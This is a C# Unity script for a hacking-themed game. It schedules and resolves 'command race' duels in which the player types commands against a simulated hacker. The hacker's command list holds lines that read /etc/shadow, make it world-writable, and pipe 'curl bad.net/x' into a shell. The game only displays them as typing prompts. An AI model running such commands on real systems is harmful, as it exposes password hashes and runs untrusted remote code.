using System;
using UnityEngine;

namespace Uptime.Connections
{
    public enum DuelVariant { CommandRace }
    public enum DuelLifecycle { Pending, Active, Result }

    public sealed class DuelEncounter
    {
        public int Id { get; internal set; }
        public NodeResources Target { get; internal set; }
        public DuelVariant Variant { get; internal set; }
        public DuelLifecycle Lifecycle { get; internal set; }
        public string Source { get; internal set; }
        public float ScheduledAt { get; internal set; }
        public float LaunchAt { get; internal set; }
        public float WarningSeconds => LaunchAt - ScheduledAt;
        public InfectionKind LossInfection { get; internal set; }
        public float LossParameter { get; internal set; }
        public bool? PlayerWon { get; internal set; }
        public bool? InfectionApplied { get; internal set; }
        public string ApplicationReason { get; internal set; }
    }

    // One authoritative slot for direct and connection-triggered Duels.
    public sealed class ConnectionsDuelDirector : MonoBehaviour
    {
        [SerializeField] private SimulationHost host;
        [SerializeField] private ConnectionsDuelOverlay overlay;
        [SerializeField, Min(0f)] private float defaultWarningSeconds = 8f;
        [SerializeField] private bool continueSimulationDuringDuel = true;
        [SerializeField] private InfectionKind lossInfection = InfectionKind.PhantomLoad;
        [SerializeField, Min(0f)] private float lossParameter = 3f;
        [SerializeField] private string[] playerCommands =
        { "ssh operator@auth", "tail -f /var/log/auth.log", "grep denied auth.log", "sudo service ssh restart" };
        [SerializeField] private string[] hackerCommands =
        { "ssh root@auth", "cat /etc/shadow", "chmod 777 /etc/shadow", "curl bad.net/x | sh" };
        [SerializeField, Min(.01f)] private float hackerCharacterSeconds = .24f;
        [SerializeField, Range(0f, .9f)] private float hackerTimingVariance = .35f;
        [SerializeField, Range(0f, 1f)] private float hackerMistakeChance = .035f;
        [SerializeField, Range(0f, 1f)] private float hackerHesitationChance = .08f;

        private DuelEncounter current;
        private int nextId;
        public DuelEncounter Current => current;
        public bool PausesSimulation => current != null &&
            current.Lifecycle != DuelLifecycle.Pending && !continueSimulationDuringDuel;
        public float DefaultWarningSeconds => defaultWarningSeconds;
        public event Action<DuelEncounter> Changed;

        private void Awake()
        {
            if (host == null) host = GetComponent<SimulationHost>();
        }

        private void OnEnable()
        {
            if (host == null) host = GetComponent<SimulationHost>();
            if (host == null) return;
            host.EffectOccurred += OnEffect;
            host.SimulationReset += ResetDuel;
        }

        private void OnDisable()
        {
            if (host != null)
            {
                host.EffectOccurred -= OnEffect;
                host.SimulationReset -= ResetDuel;
            }
            ResetDuel();
        }

        public bool TrySchedule(string targetNodeId, DuelVariant variant, float warningSeconds,
            string source, out string reason)
        {
            if (current != null)
                reason = "duel_slot_occupied_by_" + current.Lifecycle.ToString().ToLowerInvariant();
            else if (host == null || overlay == null)
                reason = "duel_unavailable";
            else if (variant != DuelVariant.CommandRace)
                reason = "unknown_duel_variant";
            else if (float.IsNaN(warningSeconds) || float.IsInfinity(warningSeconds) ||
                warningSeconds < 0f)
                reason = "invalid_warning_duration";
            else if (host.FindNodeResources(targetNodeId) == null)
                reason = "unknown_node";
            else reason = null;

            if (reason != null)
            {
                host?.Recorder?.RecordDuel("duel_rejected", current, host.SimulationTimeSeconds,
                    source, targetNodeId, reason);
                return false;
            }
            float now = host.SimulationTimeSeconds;
            current = new DuelEncounter
            {
                Id = ++nextId,
                Target = host.FindNodeResources(targetNodeId),
                Variant = variant,
                Lifecycle = DuelLifecycle.Pending,
                Source = source ?? "director",
                ScheduledAt = now,
                LaunchAt = now + warningSeconds,
                LossInfection = lossInfection,
                LossParameter = lossParameter
            };
            host.Recorder?.RecordDuel("duel_scheduled", current, now);
            Changed?.Invoke(current);
            if (warningSeconds == 0f) Launch();
            return true;
        }

        public bool TrySchedule(string targetNodeId, out string reason) =>
            TrySchedule(targetNodeId, DuelVariant.CommandRace, defaultWarningSeconds,
                "director", out reason);

        public float RemainingFor(NodeView node) => current != null &&
            current.Lifecycle == DuelLifecycle.Pending && current.Target.View == node ?
            Mathf.Max(0f, current.LaunchAt - host.SimulationTimeSeconds) : -1f;

        public float TimeToBoundary(float now) => current != null &&
            current.Lifecycle == DuelLifecycle.Pending ?
            Mathf.Max(.000001f, current.LaunchAt - now) : float.PositiveInfinity;

        public void Advance(float now)
        {
            if (current != null && current.Lifecycle == DuelLifecycle.Pending &&
                now + .00001f >= current.LaunchAt) Launch();
        }

        private void Launch()
        {
            if (current == null || current.Lifecycle != DuelLifecycle.Pending) return;
            current.Lifecycle = DuelLifecycle.Active;
            host.Recorder?.RecordDuel("duel_started", current, host.SimulationTimeSeconds);
            Changed?.Invoke(current);
            var race = new CommandRaceSession(playerCommands, hackerCommands,
                unchecked((host.GetComponent<ConnectionTrafficDirector>()?.Seed ?? 1701) ^
                    current.Id * 48271), hackerCharacterSeconds,
                hackerTimingVariance, hackerMistakeChance, hackerHesitationChance);
            overlay.Open(current, race, this);
        }

        public void Resolve(CommandRaceSession race)
        {
            if (current == null || current.Lifecycle != DuelLifecycle.Active ||
                race == null || !race.PlayerWon.HasValue) return;
            current.Lifecycle = DuelLifecycle.Result;
            current.PlayerWon = race.PlayerWon;
            if (race.PlayerWon == false)
            {
                current.InfectionApplied = host.TryApplyDuelInfection(current.Target,
                    current.LossInfection, current.LossParameter, current.Id,
                    out string error);
                current.ApplicationReason = error;
            }
            host.Recorder?.RecordDuel("duel_resolved", current, host.SimulationTimeSeconds,
                null, null, current.ApplicationReason, race);
            Changed?.Invoke(current);
            host.Recorder?.RecordDuel("duel_slot_released", current,
                host.SimulationTimeSeconds);
            current = null;
            Changed?.Invoke(null);
        }

        public void FinishResult()
        {
            // Result presentation may outlast the authoritative encounter.
        }

        public void ResetDuel()
        {
            overlay?.Abort();
            current = null;
            nextId = 0;
            Changed?.Invoke(null);
        }

        private void OnEffect(ConnectionEffectOccurrence occurrence)
        {
            if (occurrence.Type != CompletionEffect.DuelSchedule) return;
            TrySchedule(occurrence.TargetNodeId, DuelVariant.CommandRace,
                defaultWarningSeconds,
                "connection:" + occurrence.ConnectionId + "/op:" +
                    occurrence.OperationIndex, out _);
        }
    }
}
